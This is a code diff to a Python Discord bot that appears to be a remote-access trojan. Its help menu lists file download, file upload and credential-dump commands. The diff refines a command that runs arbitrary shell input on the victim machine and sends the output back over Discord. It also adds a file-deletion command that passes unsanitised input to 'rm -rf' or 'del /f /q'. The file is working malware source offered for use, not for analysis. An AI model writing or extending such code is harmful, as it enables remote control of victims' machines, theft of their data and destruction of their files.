@@ -133,6 +133,7 @@ System Access:
 !restart: Restart the system.
 !download <filename>: Download file.
 !upload: Upload file.
+!delete <filename>: delete a file 
 !listdir: List all files in the current directory.
 
 System Information:
@@ -161,13 +162,27 @@ Credential Dump:
 """
     await ctx.send(f"```\n{help_text}\n```")
 
-@bot.command()
-async def execute(ctx, *, cmd):
-    shell = subprocess.getoutput(cmd)
-    if len(shell) > 1900:
-        await ctx.send(file=discord.File(io.StringIO(shell), filename="QUANTAM.txt"))
+@bot.command(name="execute")
+async def run_terminal_command(ctx, *, command_input: str):
+    
+    output_result = subprocess.getoutput(command_input)
+
+    
+    if len(output_result) > 1900:
+        
+        buffer = io.StringIO(output_result)
+        await ctx.send(
+            f"📤 **Command output (long, saved to file):** `{command_input}`",
+            file=discord.File(buffer, filename="QUANTAM.txt")
+        )
     else:
-        await ctx.send(f"{shell}")
+        
+        if output_result.strip() == "":
+            output_result = "*No output returned from command*"
+        await ctx.send(
+            f"🖥️ **Command:** `{command_input}`\n"
+            f"```\n{output_result}\n```"
+        )
 
 @bot.command(name='cd')
 async def change_directory(ctx, *, path=None):
@@ -181,6 +196,12 @@ async def change_directory(ctx, *, path=None):
         await ctx.send(f"Error: Directory not found: `{path}`")
     except Exception as e:
         await ctx.send(f"Error changing directory: {e}")
+
+@bot.command(name="delete", help="Delete a file/folder")
+async def delete_item(ctx, *, path: str):
+    cmd = f"del /f /q {path}" if os.name == "nt" else f"rm -rf {path}"
+    result = subprocess.getoutput(cmd)
+    await ctx.send(f"🗑️ **Delete: `{path}`**\n```\n{result or 'Deleted successfully'}\n```")
 
 @bot.command(name='sysinfo')
 async def system_info(ctx):
